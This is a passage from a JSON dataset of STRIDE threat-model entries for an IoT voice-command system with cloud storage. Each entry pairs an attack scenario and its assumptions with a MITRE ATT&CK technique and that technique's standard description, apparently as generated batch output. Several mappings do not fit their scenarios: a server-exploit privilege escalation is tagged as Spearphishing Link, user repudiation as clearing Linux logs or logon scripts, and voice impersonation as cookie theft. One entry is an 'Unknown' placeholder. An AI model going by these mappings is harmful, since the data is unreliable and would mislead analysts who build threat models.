                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "IoT devices disclose sensitive information through unintentional channel leaks.",
            "Assumptions": [
                {
                    "Assumption": "IoT devices collect and transmit sensitive data",
                    "Role": "System Designer",
                    "Condition": "Devices handle personal or confidential information."
                },
                {
                    "Assumption": "The data transmission channels are not secured",
                    "Role": "System Designer",
                    "Condition": "Channels lack encryption or access control."
                },
                {
                    "Assumption": "Data leaks can be intercepted by attackers",
                    "Role": "Attacker",
                    "Condition": "The attacker has network access and sniffing capability."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive environmental or personal data.",
            "MITRE ATT&CK Keywords": [
                "data leakage",
                "unintentional disclosure",
                "IoT",
                "information exposure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Attackers flood the server with excessive voice command requests, overwhelming its processing capacity.",
            "Assumptions": [
                {
                    "Assumption": "The server is accessible over the Internet",
                    "Role": "System Designer",
                    "Condition": "The application is internet-facing."
                },
                {
                    "Assumption": "The attacker can generate large volumes of requests",
                    "Role": "Attacker",
                    "Condition": "The attacker has access to multiple devices or a botnet."
                },
                {
                    "Assumption": "There are no effective rate-limiting or DoS mitigation controls",
                    "Role": "System Designer",
                    "Condition": "The system does not limit request rates or have protection mechanisms."
                }
            ],
            "Potential Impact": "Service disruption, system unavailability for legitimate users.",
            "MITRE ATT&CK Keywords": [
                "DoS",
                "service disruption",
                "request flooding",
                "resource exhaustion"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker targets IoT devices with malformed commands to crash the devices.",
            "Assumptions": [
                {
                    "Assumption": "IoT devices are vulnerable to malformed input",
                    "Role": "System Designer",
                    "Condition": "Devices do not properly validate input commands."
                },
                {
                    "Assumption": "The attacker has knowledge of the vulnerability",
                    "Role": "Attacker",
                    "Condition": "The vulnerability is known or discovered by the attacker."
                },
                {
                    "Assumption": "Devices do not have crash recovery mechanisms",
                    "Role": "System Designer",
                    "Condition": "Devices do not automatically recover from crashes."
                }
            ],
            "Potential Impact": "IoT device inoperability, loss of functionality and service.",
            "MITRE ATT&CK Keywords": [
                "DoS",
                "input validation",
                "device crash",
                "malformed input"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker uses voice command injection to overload the client-side application.",
            "Assumptions": [
                {
                    "Assumption": "The client-side application accepts external voice commands",
                    "Role": "System Designer",
                    "Condition": "Voice commands are processed directly from the microphone."
                },
                {
                    "Assumption": "The attacker is within the voice range of the device",
                    "Role": "Attacker",
                    "Condition": "The attacker has physical or radio frequency proximity."
                },
                {
                    "Assumption": "There are no protections against abusive command sequences",
                    "Role": "System Designer",
                    "Condition": "The application lacks constraints on command sequences."
                }
            ],
            "Potential Impact": "Client-side application failure, inability to process legitimate commands.",
            "MITRE ATT&CK Keywords": [
                "DoS",
                "command injection",
                "application overload",
                "voice interactions"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the server-side application to gain admin-level access.",
            "Assumptions": [
                {
                    "Assumption": "There are unpatched vulnerabilities in the server application",
                    "Role": "System Administrator",
                    "Condition": "Vulnerabilities have not been updated or remediated."
                },
                {
                    "Assumption": "The attacker has the capability to exploit the vulnerability",
                    "Role": "Attacker",
                    "Condition": "The attacker has exploitation tools and skills."
                },
                {
                    "Assumption": "Server-side monitoring does not detect unusual activities",
                    "Role": "System Designer",
                    "Condition": "Security monitoring is not robust or comprehensive."
                }
            ],
            "Potential Impact": "Complete compromise of server control, unauthorized actions and data access.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "server vulnerability",
                "admin access",
                "exploit"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.\n\nAdversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an \"IDN homograph attack\").(Citation: CISA IDN ST05-016) URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)\n\nAdversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: Trend Micro Pawn Storm OAuth 2017) These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. (Citation: Microsoft OAuth 2.0 Consent Phishing 2021)\n\nAdversaries may also utilize spearphishing links to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s that grant immediate access to the victim environment. For example, a user may be lured through \u201cconsent phishing\u201d into granting adversaries permissions/access via a malicious OAuth 2.0 request URL .(Citation: Trend Micro Pawn Storm OAuth 2017)(Citation: Microsoft OAuth 2.0 Consent Phishing 2021)\n\nSimilarly, malicious links may also target device-based authorization, such as OAuth 2.0 device authorization grant flow which is typically used to authenticate devices without UIs/browsers. Known as \u201cdevice code phishing,\u201d an adversary may send a link that directs the victim to a malicious authorization page where the user is tricked into entering a code/credentials that produces a device token.(Citation: SecureWorks Device Code Phishing 2021)(Citation: Netskope Device Code Phishing 2021)(Citation: Optiv Device Code Phishing 2021)",
                "id": "attack-pattern--2b742742-28c3-4e1b-bab7-8350d6300fa7",
                "technique_id": "T1566.002"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker tampers with firmware to gain elevated privileges on an IoT device.",
            "Assumptions": [
                {
                    "Assumption": "Firmware does not enforce signed updates",
                    "Role": "System Designer",
                    "Condition": "Firmware integrity is not verified before updates."
                },
                {
                    "Assumption": "The attacker can bypass physical security mechanisms",
                    "Role": "Attacker",
                    "Condition": "The device is accessible and not secured physically."
                },
                {
                    "Assumption": "Device security logs and mechanisms do not detect tampering",
                    "Role": "System Designer",
                    "Condition": "Security mechanisms are insufficient or disabled."
                }
            ],
            "Potential Impact": "Full control over IoT device functions, potential misuse.",
            "MITRE ATT&CK Keywords": [
                "firmware tampering",
                "elevated privilege",
                "IoT exploitation",
                "device control"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses social engineering to obtain high-privilege credentials within the cloud services.",
            "Assumptions": [
                {
                    "Assumption": "High-privilege users are susceptible to phishing or social engineering",
                    "Role": "User",
                    "Condition": "Users are not sufficiently trained on security awareness."
                },
                {
                    "Assumption": "There is no multifactor authentication for critical accounts",
                    "Role": "System Administrator",
                    "Condition": "Accounts do not have multifactor authentication enabled."
                },
                {
                    "Assumption": "The attacker has the skills to craft convincing social engineering attacks",
                    "Role": "Attacker",
                    "Condition": "The attacker is skilled in social engineering tactics."
                }
            ],
            "Potential Impact": "Compromise of cloud services leading to data breaches or unauthorized system control.",
            "MITRE ATT&CK Keywords": [
                "social engineering",
                "credential theft",
                "cloud services",
                "high-privilege access"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)",
                "id": "attack-pattern--20138b9d-1aac-4a26-8654-a36b6bbf2bba",
                "technique_id": "T1192"
            }
        }
    ]
},
{
    "case_number": "1",
    "batch_number": "8",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker falsifies the source of IoT controller commands.",
            "Assumptions": [
                {
                    "Assumption": "The IoT controller accepts commands from unknown sources.",
                    "Role": "IoT Controller",
                    "Condition": "If proper authentication is not enforced."
                },
                {
                    "Assumption": "Network traffic is not encrypted.",
                    "Role": "Network",
                    "Condition": "If the communication between components is unencrypted."
                },
                {
                    "Assumption": "Network endpoint is not secured.",
                    "Role": "IoT Devices",
                    "Condition": "If the devices are exposed to the public internet."
                }
            ],
            "Potential Impact": "Unauthorized execution of commands on IoT devices.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "device",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker imitates a legitimate user to access the voice-based system.",
            "Assumptions": [
                {
                    "Assumption": "Voice recognition system has limited accuracy.",
                    "Role": "Voice Recognition System",
                    "Condition": "If the system can't accurately differentiate between users."
                },
                {
                    "Assumption": "System does not use multi-factor authentication.",
                    "Role": "Authentication",
                    "Condition": "If authentication relies solely on voice."
                },
                {
                    "Assumption": "There is no continuous monitoring of user behavior.",
                    "Role": "Behavior Monitoring",
                    "Condition": "If behavior patterns are not analyzed."
                }
            ],
            "Potential Impact": "Unauthorized user access leading to potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "user",
                "voice authentication"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker manipulates the microphone input to record unauthorized commands.",
            "Assumptions": [
                {
                    "Assumption": "Microphone is always on and lacks security features.",
                    "Role": "Microphone",
                    "Condition": "If the microphone does not have a physical on-off switch."
                },
                {
                    "Assumption": "Voice commands are broadcast without proper network security.",
                    "Role": "Network",
                    "Condition": "If network encryption is not in place."
                },
                {
                    "Assumption": "System does not verify the source of voice commands.",
                    "Role": "Voice Command Processor",
                    "Condition": "If system does not authenticate voice sources."
                }
            ],
            "Potential Impact": "Recording and misuse of sensitive commands.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "microphone",
                "voice commands"
            ],
            "mitre_technique": {
                "name": "Audio Capture",
                "description": "An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.(Citation: ESET Attor Oct 2019)\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.",
                "id": "attack-pattern--1035cdf2-3e5f-446f-a7a7-e8f6d7925967",
                "technique_id": "T1123"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the firmware of IoT devices through the IoT controller.",
            "Assumptions": [
                {
                    "Assumption": "Firmware updates are not authenticated.",
                    "Role": "IoT Controller",
                    "Condition": "If the firmware update process is insecure."
                },
                {
                    "Assumption": "Network traffic is not encrypted.",
                    "Role": "Network",
                    "Condition": "If communication is susceptible to interception."
                },
                {
                    "Assumption": "IoT devices are physically accessible.",
                    "Role": "IoT Devices",
                    "Condition": "If devices are not physically secured."
                }
            ],
            "Potential Impact": "Compromised device functionality leading to potential system control loss.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "device"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters the commands sent from the client-side application to the IoT controller.",
            "Assumptions": [
                {
                    "Assumption": "Network traffic is not encrypted.",
                    "Role": "Network",
                    "Condition": "If the network is accessible by attackers."
                },
                {
                    "Assumption": "Commands are not verified for integrity.",
                    "Role": "IoT Controller",
                    "Condition": "If integrity checks are not applied."
                },
                {
                    "Assumption": "System does not log command histories.",
                    "Role": "System Logging",
                    "Condition": "If there is no audit trail."
                }
            ],
            "Potential Impact": "Unauthorized command execution affecting IoT device behavior.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "commands",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies data stored in cloud services related to voice commands.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage is not secured.",
                    "Role": "Cloud Services",
                    "Condition": "If cloud access control policies are weak."
                },
                {
                    "Assumption": "Data is not encrypted.",
                    "Role": "Data Storage",
                    "Condition": "If data is stored in plaintext."
                },
                {
                    "Assumption": "Access logs are not monitored.",
                    "Role": "System Monitoring",
                    "Condition": "If access logs are ignored or incomplete."
                }
            ],
            "Potential Impact": "Corruption of stored data leading to erroneous system responses.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "cloud",
                "data"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A legitimate user denies issuing specific voice commands to the system.",
            "Assumptions": [
                {
                    "Assumption": "System does not maintain detailed command logs.",
                    "Role": "System Logging",
                    "Condition": "If logging is inadequate."
                },
                {
                    "Assumption": "Voice commands are not timestamped.",
                    "Role": "Time Tracking",
                    "Condition": "If commands lack timestamps."
                },
                {
                    "Assumption": "There is no mechanism for user acknowledgment.",
                    "Role": "User Interaction",
                    "Condition": "If the system doesn\u2019t validate user actions."
                }
            ],
            "Potential Impact": "Inability to verify actions within the system leading to accountability issues.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "user commands"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker manipulates logs to erase traces of malicious activity.",
            "Assumptions": [
                {
                    "Assumption": "System logs are not protected.",
                    "Role": "System Logging",
                    "Condition": "If logs are easily accessible."
                },
                {
                    "Assumption": "Log integrity is not verified.",
                    "Role": "Log Integrity",
                    "Condition": "If logs can be modified without detection."
                },
                {
                    "Assumption": "There is no redundancy in logging mechanisms.",
                    "Role": "System Redundancy",
                    "Condition": "If logs are stored in a single location."
                }
            ],
            "Potential Impact": "Loss of crucial forensic data and inability to track malicious actions.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logs",
                "forensics"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies accessing certain IoT devices despite evidence.",
            "Assumptions": [
                {
                    "Assumption": "Access audits are not performed regularly.",
                    "Role": "Audit",
                    "Condition": "If audits are infrequent or incomplete."
                },
                {
                    "Assumption": "There is no user activity tracking.",
                    "Role": "User Tracking",
                    "Condition": "If user actions are not monitored."
                },
                {
                    "Assumption": "System allows anonymous access.",
                    "Role": "Authentication",
                    "Condition": "If user actions are not tied to specific identities."
                }
            ],
            "Potential Impact": "Accountability issues and potential misuse of system resources.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "audit",
                "access"
            ],
            "mitre_technique": {
                "name": "Boot or Logon Initialization Scripts",
                "description": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.(Citation: Mandiant APT29 Eye Spy Email Nov 22)(Citation: Anomali Rocke March 2019) Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  \n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \n\nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",
                "id": "attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334",
                "technique_id": "T1037"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts voice commands over the network.",
            "Assumptions": [
                {
                    "Assumption": "Network traffic is unencrypted.",
                    "Role": "Network",
                    "Condition": "If encryption is not enforced."
                },
                {
                    "Assumption": "System does not use secure communication channels.",
                    "Role": "Communication",
                    "Condition": "If secure protocols are not used."
                },
                {
                    "Assumption": "Attackers have access to the network.",
                    "Role": "Network Security",
                    "Condition": "If the network is compromised."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive voice data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "network",
                "interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
